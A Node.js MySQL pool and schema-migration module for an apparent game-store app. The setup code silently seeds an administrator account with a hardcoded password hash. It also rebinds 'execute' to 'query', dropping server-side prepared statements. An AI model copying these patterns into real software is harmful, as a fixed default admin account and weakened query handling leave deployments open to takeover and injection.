import mysql from 'mysql2/promise';
import env from './config.js';

const pool = mysql.createPool({
  host: env.DB_HOST, port: env.DB_PORT, user: env.DB_USER, password: env.DB_PASSWORD,
  database: env.DB_NAME, waitForConnections: true, connectionLimit: 10,
  queueLimit: 0, ssl: { minVersion: 'TLSv1.2', rejectUnauthorized: true }, charset: 'utf8mb4', timezone: 'Z', decimalNumbers: true,
});

pool.on('connection', (conn) => { conn.query("SET time_zone = '+00:00'"); });
const rawGetConnection = pool.getConnection.bind(pool);
pool.getConnection = async (...args) => {
  const conn = await rawGetConnection(...args);
  conn.execute = conn.query.bind(conn);
  return conn;
};
pool.execute = pool.query.bind(pool);

let schemaReadyPromise = null;

/**
 * Safely applies Module 1 schema updates (publisher ownership, rejection reason,
 * publisher review replies, game patches) if columns or tables do not yet exist.
 */
export function ensureSchemaReady() {
  if (!schemaReadyPromise) {
    schemaReadyPromise = (async () => {
      try {
        await pool.execute("ALTER TABLE users MODIFY role ENUM('customer','publisher','staff','admin') NOT NULL DEFAULT 'customer'");
      } catch {}

      const [prodCols] = await pool.execute(
        `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
         WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'products'
         AND COLUMN_NAME IN ('publisher_user_id', 'rejection_reason')`
      );
      const existingProdCols = new Set(prodCols.map((r) => r.COLUMN_NAME));
      if (!existingProdCols.has('publisher_user_id')) {
        await pool.execute('ALTER TABLE products ADD COLUMN publisher_user_id BIGINT UNSIGNED NULL AFTER developer');
      }
      if (!existingProdCols.has('rejection_reason')) {
        await pool.execute('ALTER TABLE products ADD COLUMN rejection_reason VARCHAR(500) NULL AFTER status');
      }

      const [fkRows] = await pool.execute(
        `SELECT CONSTRAINT_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS
         WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'products' AND CONSTRAINT_NAME = 'fk_products_publisher'`
      );
      if (!fkRows.length) {
        await pool.execute('ALTER TABLE products ADD CONSTRAINT fk_products_publisher FOREIGN KEY (publisher_user_id) REFERENCES users(id) ON DELETE SET NULL');
      }

      const [revCols] = await pool.execute(
        `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
         WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'reviews'
         AND COLUMN_NAME IN ('publisher_reply', 'publisher_replied_at')`
      );
      const existingRevCols = new Set(revCols.map((r) => r.COLUMN_NAME));
      if (!existingRevCols.has('publisher_reply')) {
        await pool.execute('ALTER TABLE reviews ADD COLUMN publisher_reply TEXT NULL AFTER body');
      }
      if (!existingRevCols.has('publisher_replied_at')) {
        await pool.execute('ALTER TABLE reviews ADD COLUMN publisher_replied_at DATETIME NULL AFTER publisher_reply');
      }

      await pool.execute(`
        CREATE TABLE IF NOT EXISTS game_patches (
          id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
          product_id BIGINT UNSIGNED NOT NULL,
          version VARCHAR(32) NOT NULL,
          title VARCHAR(200) NOT NULL,
          patch_notes TEXT NOT NULL,
          size_mb INT UNSIGNED NOT NULL DEFAULT 150,
          is_dlc BOOLEAN NOT NULL DEFAULT FALSE,
          released_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
          FOREIGN KEY (product_id) REFERENCES products(id) ON DELETE CASCADE,
          INDEX(product_id, released_at)
        ) ENGINE=InnoDB
      `);

      const [ordCols] = await pool.execute(
        `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
         WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'orders'
         AND COLUMN_NAME IN ('recipient_user_id', 'gift_email', 'gift_message')`
      );
      const existingOrdCols = new Set(ordCols.map((r) => r.COLUMN_NAME));
      if (!existingOrdCols.has('recipient_user_id')) {
        await pool.execute('ALTER TABLE orders ADD COLUMN recipient_user_id BIGINT UNSIGNED NULL AFTER user_id');
      }
      if (!existingOrdCols.has('gift_email')) {
        await pool.execute('ALTER TABLE orders ADD COLUMN gift_email VARCHAR(254) NULL AFTER shipping_address');
      }
      if (!existingOrdCols.has('gift_message')) {
        await pool.execute('ALTER TABLE orders ADD COLUMN gift_message VARCHAR(500) NULL AFTER gift_email');
      }

      const [ordFkRows] = await pool.execute(
        `SELECT CONSTRAINT_NAME FROM INFORMATION_SCHEMA.TABLE_CONSTRAINTS
         WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'orders' AND CONSTRAINT_NAME = 'fk_orders_recipient'`
      );
      if (!ordFkRows.length) {
        await pool.execute('ALTER TABLE orders ADD CONSTRAINT fk_orders_recipient FOREIGN KEY (recipient_user_id) REFERENCES users(id) ON DELETE SET NULL');
      }

      await pool.execute(`
        CREATE TABLE IF NOT EXISTS game_mods (
          id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
          product_id BIGINT UNSIGNED NOT NULL,
          author_user_id BIGINT UNSIGNED NOT NULL,
          title VARCHAR(180) NOT NULL,
          category VARCHAR(60) NOT NULL DEFAULT 'LỐI CHỌI',
          version VARCHAR(32) NOT NULL DEFAULT '1.0.0',
          size_label VARCHAR(32) NOT NULL DEFAULT '15 MB',
          description TEXT NOT NULL,
          downloads_count INT UNSIGNED NOT NULL DEFAULT 0,
          rating DECIMAL(3,2) NOT NULL DEFAULT 4.80,
          status ENUM('published','hidden') NOT NULL DEFAULT 'published',
          created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
          FOREIGN KEY (product_id) REFERENCES products(id) ON DELETE CASCADE,
          FOREIGN KEY (author_user_id) REFERENCES users(id) ON DELETE CASCADE,
          INDEX(product_id, status)
        ) ENGINE=InnoDB
      `);

      const [libCols] = await pool.execute(
        `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
         WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'game_library'
         AND COLUMN_NAME IN ('installed_version', 'dlc_installed')`
      );
      const existingLibCols = new Set(libCols.map((r) => r.COLUMN_NAME));
      if (!existingLibCols.has('installed_version')) {
        await pool.execute("ALTER TABLE game_library ADD COLUMN installed_version VARCHAR(32) NOT NULL DEFAULT '1.0.0' AFTER status");
      }
      if (!existingLibCols.has('dlc_installed')) {
        await pool.execute('ALTER TABLE game_library ADD COLUMN dlc_installed BOOLEAN NOT NULL DEFAULT FALSE AFTER installed_version');
      }

      try {
        await pool.execute(
          "INSERT IGNORE INTO users(email,password_hash,display_name,role) VALUES ('admin@5guys.com','$2a$12$pUuj40AP3ieK5j.HeHi6sOKN7Q4VDkEiQDcov7E5mUJ2TS8jETnNy','Admin','admin')"
        );
      } catch {}
    })().catch((err) => {
      schemaReadyPromise = null;
      throw err;
    });
  }
  return schemaReadyPromise;
}

/** Runs an async callback inside a MySQL transaction, rolling back on error. */
export async function inTransaction(work) {
  const conn = await pool.getConnection();
  try {
    await conn.beginTransaction();
    const result = await work(conn);
    await conn.commit();
    return result;
  } catch (e) {
    await conn.rollback();
    throw e;
  } finally {
    conn.release();
  }
}

export default pool;
